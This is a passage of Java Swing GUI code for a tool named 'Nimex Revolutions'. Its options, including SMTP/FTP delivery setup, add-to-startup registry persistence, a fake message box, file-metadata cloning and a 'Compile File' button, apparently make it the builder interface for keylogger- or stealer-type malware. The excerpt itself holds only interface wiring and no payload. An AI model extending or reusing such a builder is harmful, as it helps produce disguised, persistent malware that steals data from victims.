		TOSPage.setBorder(new LineBorder(new Color(0, 0, 0), 0));
		Tabpage_Pages.addTab("Terms of Service", null, TOSPage, null);
		TOSPage.setLayout(null);
		
		JLabel LogoPictureBox = new javax.swing.JLabel();
		LogoPictureBox.setIcon(new ImageIcon(Nimex_Form.class.getResource("/Images/rsz_op.png")));
		 LogoPictureBox.setBounds(171, 264, 274, 72);
		frmNimexRevolutions.getContentPane().add(LogoPictureBox);
		
		JButton WebsiteButton = new JButton("Website");
		WebsiteButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0)
			{
				try 
				{
					URI link = new URI("http://www.nimexrevolutions.com");
					java.awt.Desktop.getDesktop().browse(link);
				} catch (IOException | URISyntaxException e) {
					e.printStackTrace();
				}
			}
		});
		WebsiteButton.setBounds(102, 276, 75, 30);
		WebsiteButton.setFont(SetFont(11));
		frmNimexRevolutions.getContentPane().add(WebsiteButton);
		
		JButton SupportButton = new JButton("Support");
		SupportButton.setBounds(17, 276, 75, 30);
		SupportButton.setFont(SetFont(11));
		frmNimexRevolutions.getContentPane().add(SupportButton);
		
		JLabel ServerStatus = new JLabel("Server Status:");
		ServerStatus.setFont(new Font("Segoe UI", Font.PLAIN, 11));
		ServerStatus.setBounds(37, 314, 69, 14);
		frmNimexRevolutions.getContentPane().add(ServerStatus);
		
		ServerOffOn = new JLabel("Wait...");
		ServerOffOn.setFont(new Font("Segoe UI", Font.PLAIN, 11));
		ServerOffOn.setForeground(Color.decode("#936815"));
		ServerOffOn.setBounds(112, 314, 49, 14);
		frmNimexRevolutions.getContentPane().add(ServerOffOn);
		frmNimexRevolutions.setFocusTraversalPolicy(new FocusTraversalOnArray(new Component[]{MainTabPage, frmNimexRevolutions.getContentPane(), Tabpage_Pages}));
		//
	}
	
	public JButton getBtnNewButton_1() {
		return BtnNewButton_1;
	}

	private class button1 extends AbstractAction 
	{
		/**
		 * 
		 */
		private static final long serialVersionUID = 1L;
		public button1() 
		{
			putValue(NAME, "Load Settings");
		}
		public void actionPerformed(ActionEvent e) 
		{
			// Action here
		}
		
	}
	private class SMTP_RD extends AbstractAction 
	{
		/**
		 * 
		 */
		private static final long serialVersionUID = 1L;
		public SMTP_RD() 
		{
			putValue(NAME, "SMTP Setup");
		}
		public void actionPerformed(ActionEvent e) 
		{
			Component[] com = FTP_GroupBox.getComponents();
			for (int a = 0; a < com.length; a++) 
			{
			     com[a].setEnabled(false);
			}
			Component[] com2 = SMTP_GroupBox.getComponents();
			for (int a = 0; a < com2.length; a++) 
			{
			     com2[a].setEnabled(true);
			}
		}
	}

	private class FTP_RD extends AbstractAction 
	{
		/**
		 * 
		 */
		private static final long serialVersionUID = 1L;
		public FTP_RD() 
		{
			putValue(NAME, "FTP Setup");
		}
		public void actionPerformed(ActionEvent e) 
		{
			Component[] com = FTP_GroupBox.getComponents();
			for (int a = 0; a < com.length; a++) 
			{
			     com[a].setEnabled(true);
			}
			Component[] com2 = SMTP_GroupBox.getComponents();
			for (int a = 0; a < com2.length; a++) 
			{
			     com2[a].setEnabled(false);
			}
		}
	}
	private class AgreeTOS extends AbstractAction {
		/**
		 * 
		 */
		private static final long serialVersionUID = 1L;
		public AgreeTOS() {
			putValue(NAME, "I Agree with Terms of Service");
		}
		public void actionPerformed(ActionEvent e) 
		{
			if (ToSCheckbox.isSelected())
			{
				CompileFileButton.setEnabled(true);
			}
			else
			{
				CompileFileButton.setEnabled(false);
			}
		}
	}

	private class EnableWebsiteVisitor extends AbstractAction {
		/**
		 * 
		 */
		private static final long serialVersionUID = 1L;
		public EnableWebsiteVisitor() {
			putValue(NAME, "Enable");
		}
		public void actionPerformed(ActionEvent e) 
		{
			if (EnableWebsiteVis.isSelected())
			{
				// txtTitleHere.setEnabled(true);
				//txtDescriptionHere.setEnabled(true);
				//txtProductHere.setEnabled(true);
				//txtCopyrightHere.setEnabled(true);
				//txtTrademarkHere.setEnabled(true);
				//Button_CLONEFILE.setEnabled(true);
				//Button_GENERATERND.setEnabled(true);
			}
			else
			{
				//txtTitleHere.setEnabled(false);
				//txtDescriptionHere.setEnabled(false);
				//txtProductHere.setEnabled(false);
				//txtCopyrightHere.setEnabled(false);
				//txtTrademarkHere.setEnabled(false);
				//Button_CLONEFILE.setEnabled(false);
				//Button_GENERATERND.setEnabled(false);
			}
		}
	}
	private class EnableAddToStartup extends AbstractAction {
		/**
		 * 
		 */
		private static final long serialVersionUID = 1L;
		public EnableAddToStartup() {
			putValue(NAME, "Enable");
		}
		public void actionPerformed(ActionEvent e) 
		{
			if (Enable_ADDTOSTARTUP.isSelected())
			{
				TextField_VALUEKEY.setEnabled(true);
				Combobox_PATHLOCATION.setEnabled(true);
			}
			else
			{
				TextField_VALUEKEY.setEnabled(false);
				Combobox_PATHLOCATION.setEnabled(false);
			}
		}
	}
	private class EnableFakeMessageBox extends AbstractAction {
		/**
		 * 
		 */
		private static final long serialVersionUID = 1L;
		public EnableFakeMessageBox() {
			putValue(NAME, "Enable");
		}
		public void actionPerformed(ActionEvent e) 
		{
			if (Enable_FAKEMESSAGEBOX.isSelected())
			{
				TextField_TITLETEXT.setEnabled(true);
				TextField_MESSAGEBOX.setEnabled(true);
				Critical_RB.setEnabled(true);
				Warning_RB.setEnabled(true);
				Information_RB.setEnabled(true);
				Button_TESTFAKEMESSAGEBOX.setEnabled(true);
			}
			else
			{
				TextField_TITLETEXT.setEnabled(false);
				TextField_MESSAGEBOX.setEnabled(false);
				Critical_RB.setEnabled(false);
				Warning_RB.setEnabled(false);
				Information_RB.setEnabled(false);
				Button_TESTFAKEMESSAGEBOX.setEnabled(false);
			}
		}
		
	}
	public static void setText(String text)
	{
		BtnNewButton_1.setText(text);
	}
	
	public static void setTextFTP(String text)
	{
		btnNewButton_2.setText(text);
	}
}
